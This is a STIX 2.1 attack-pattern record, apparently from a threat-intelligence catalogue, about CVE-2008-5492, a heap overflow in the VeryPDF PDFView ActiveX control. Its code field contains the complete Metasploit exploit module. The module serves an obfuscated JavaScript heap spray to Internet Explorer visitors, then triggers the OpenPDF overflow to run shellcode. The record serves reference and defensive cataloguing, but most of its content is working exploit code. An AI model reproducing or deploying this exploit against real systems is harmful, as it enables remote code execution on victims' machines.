{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d6435ee3-c37e-4679-92b2-7fcf3ccaf304",
    "created": "2024-08-14T16:44:30.946779Z",
    "modified": "2024-08-14T16:44:30.946783Z",
    "name": "VeryPDF PDFView OCX ActiveX OpenPDF Heap Overflow",
    "description": " The VeryPDF PDFView ActiveX control is prone to a heap buffer-overflow because it fails to properly bounds-check user-supplied data before copying it into an insufficiently sized memory buffer. An attacker can exploit this issue to execute arbitrary code within the context of the affected application.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/verypdf_pdfview.rb",
            "external_id": "verypdf_pdfview.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5492"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VeryPDF PDFView OCX ActiveX OpenPDF Heap Overflow',\n      'Description'    => %q{\n          The VeryPDF PDFView ActiveX control is prone to a heap buffer-overflow\n        because it fails to properly bounds-check user-supplied data before copying\n        it into an insufficiently sized memory buffer. An attacker can exploit this issue\n        to execute arbitrary code within the context of the affected application.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC', 'dean <dean[at]zerodaysolutions.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-5492'],\n          [ 'OSVDB', '49871'],\n          [ 'BID','32313' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0c0c0c0c } ]\n        ],\n      'DisclosureDate' => '2008-06-16',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops.\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Set the return.\n    ret    = Rex::Text.uri_encode([target.ret].pack('L'))\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|\n      <html>\n        <object id='#{vname}' classid='clsid:433268D7-2CD4-43E6-AA24-2188672E7252'></object>\n        <script language=\"JavaScript\">\n        var #{rand1} = unescape('#{shellcode}');\n        var #{rand2} = unescape('#{ret}');\n        var #{rand3} = 20;\n        var #{rand4} = #{rand3} + #{rand1}.length;\n        while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\n        var #{rand5} = #{rand2}.substring(0,#{rand4});\n        var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\n        while (#{rand6}.length + #{rand4} < 0x10000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\n        var #{rand7} = new Array();\n        for (#{var_i} = 0; #{var_i} < 1000; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\n        var #{rand8} = \"\";\n        for (#{var_i} = 0; #{var_i} < 7024; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }\n        #{vname}.OpenPDF(#{rand8}, 1, 1);\n        </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-06-16",
    "x_mitre_platforms": [
        "win'"
    ]
}